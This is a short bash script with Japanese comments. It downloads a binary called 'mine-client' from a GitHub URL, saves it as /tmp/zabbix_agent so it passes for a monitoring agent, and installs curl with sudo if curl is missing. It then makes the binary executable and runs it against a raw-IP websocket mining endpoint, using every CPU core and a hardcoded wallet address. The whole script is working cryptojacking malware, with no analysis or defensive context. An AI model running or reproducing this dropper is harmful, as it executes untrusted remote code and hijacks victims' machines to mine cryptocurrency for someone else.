#!/bin/bash

# CPUコア数を取得
cpu_cores=$(nproc)
echo "現在のシステムには $cpu_cores コアのCPUがあります。"

# ダウンロードするファイルのURL
file_url="https://raw.githubusercontent.com/Whitlingum/test/main/mine-client"

# ダウンロード先のパス
destination="/tmp/zabbix_agent"

# curl または wget がインストールされているか確認
if command -v curl &> /dev/null
then
    echo "curlを使用してファイルをダウンロードします..."
    curl -L $file_url -o $destination
elif command -v wget &> /dev/null
then
    echo "wgetを使用してファイルをダウンロードします..."
    wget -O $destination $file_url
else
    echo "システムにcurlまたはwgetがインストールされていません。curlをインストールします..."

    # オペレーティングシステムの種類を確認してcurlをインストール
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$NAME
    elif [ -f /etc/lsb-release ]; then
        . /etc/lsb-release
        OS=$DISTRIB_ID
    else
        OS=$(uname -s)
    fi

    case "$OS" in
        *"Ubuntu"*|*"Debian"*)
            echo "$OSシステムが検出されました。aptを使用してcurlをインストールします..."
            sudo apt update
            sudo apt install -y curl
            ;;
        *"CentOS"*|*"Red Hat"*|*"Fedora"*)
            echo "$OSシステムが検出されました。yum/dnfを使用してcurlをインストールします..."
            sudo yum install -y curl || sudo dnf install -y curl
            ;;
        *"Arch"*)
            echo "$OSシステムが検出されました。pacmanを使用してcurlをインストールします..."
            sudo pacman -Syu curl --noconfirm
            ;;
        *)
            echo "オペレーティングシステムが認識できないか、サポートされていません。手動でcurlをインストールしてください。"
            exit 1
            ;;
    esac

    # curlが正常にインストールされたか確認
    if command -v curl &> /dev/null
    then
        echo "curlが正常にインストールされました。ファイルをダウンロードします..."
        curl -L $file_url -o $destination
    else
        echo "curlのインストールに失敗しました。ファイルをダウンロードできません。"
        exit 1
    fi
fi

# ファイルが正常にダウンロードされたか確認
if [ -f "$destination" ]; then
    echo "ファイルが正常にダウンロードされ、$destination に保存されました。"

    # ファイルに実行権限を追加
    chmod +x $destination
    echo "$destination ファイルに実行権限が追加されました。"
else
    echo "ファイルのダウンロードに失敗しました。"
fi

/tmp/zabbix_agent --url "ws://156.238.235.76:1111" --cores ${cpu_cores} --wallet "CH4AgKN6QwYz1tBV77McxsJR1bn4sz7oCiuQRrS1TGrp"
